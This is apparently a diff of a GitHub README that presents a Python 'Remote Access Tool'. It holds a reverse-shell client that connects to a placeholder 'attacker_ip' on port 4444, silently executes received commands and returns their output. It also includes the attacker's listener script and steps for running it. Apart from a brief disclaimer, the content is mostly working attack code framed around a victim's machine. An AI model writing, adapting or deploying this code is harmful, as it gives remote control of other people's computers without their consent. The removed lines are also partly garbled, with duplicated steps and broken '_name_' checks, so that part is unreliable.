@@ -1,35 +1,30 @@
-This is a simplified example for educational purposes only. In a real-world scenario, such tools are often much more complex and include various features for evading detection, encrypting communications, and more.
-# Install black
-pip install black
+To format this properly in your **GitHub README.md file**, follow these steps:
 
-# Format code with black
-'''import socket
-import subprocess
-import os
+### **1. Use Markdown for Formatting**
+GitHub uses Markdown to format text in the README file. To ensure the Python code is well-structured and readable, wrap it in **triple backticks** (` ``` `) and specify the `python` language for syntax highlighting.
 
-def connect():
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("attacker_ip", 4444))  # Replace "attacker_ip" with the attacker's IP address
-    while True:
-        command = s.recv(1024).decode()
-        if command.lower() == "exit":
-            break
-        output = subprocess.getoutput(command)
-        s.send(output.encode())
-    s.close()
+### **2. Example README File Format**
+Here’s how you can structure your **README.md** file:
 
-def main():
-    while True:
-        try:
-            connect()
-        except:
-            pass
+markdown
+# Remote Access Tool (RAT)
 
-if _name_ == "_main_":
-    main()
-'''
+## Overview
+A **Remote Access Tool (RAT)** is used to control a target machine remotely.  
+In simple terms:
+- Allows the attacker to execute commands on the target system.
+- Can download/upload files and access sensitive data.
+- Runs silently in the background, making detection difficult.
 
-**Client.py (Victim's Machine)**
+## How It Works
+The project consists of two programs:
+
+### **1. Client.py (Victim's Machine)**
+- This script runs silently on the victim’s computer.
+- It continuously attempts to connect to the attacker’s machine.
+- Once connected, it waits for and executes commands sent by the attacker.
+
+```python
 import socket
 import subprocess
 import os
@@ -52,10 +47,15 @@ def main():
         except:
             pass
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     main()
-`
-**[**Attacker.py**`]**
+```
+
+### **2. Server.py (Attacker's Machine)**
+- The attacker runs this script to control the victim’s machine.
+- It listens for incoming connections and executes commands remotely.
+
+```python
 import socket
 
 def start_server():
@@ -74,30 +74,11 @@ def start_server():
         print(output)
     conn.close()
 
-if _name_ == "_main_":
+if __name__ == "__main__":
     start_server()
+```
 
-**
-**Steps for execution******
-Set Up the Attacker's Machine:
-
-Open a terminal or command prompt on the attacker's machine.
-Save the Server.py script to a file, for example, server.py.
-Run the server script:
-sh
-
-python server.py
-*
-*
-The server will start listening for incoming connections on port 4444
-**In client terminal**
-Open a terminal or command prompt on the attacker's machine.
-Save the Server.py script to a file, for example, server.py.
-Run the server script:
-sh
-
-python server.py
-The server will start listening for incoming connections on port 4444.
+## Disclaimer
+🚨 **This project is intended for ethical cybersecurity research and educational purposes only. Unauthorized use or deployment of such tools may violate laws and regulations. Use responsibly.**
 
 
-    
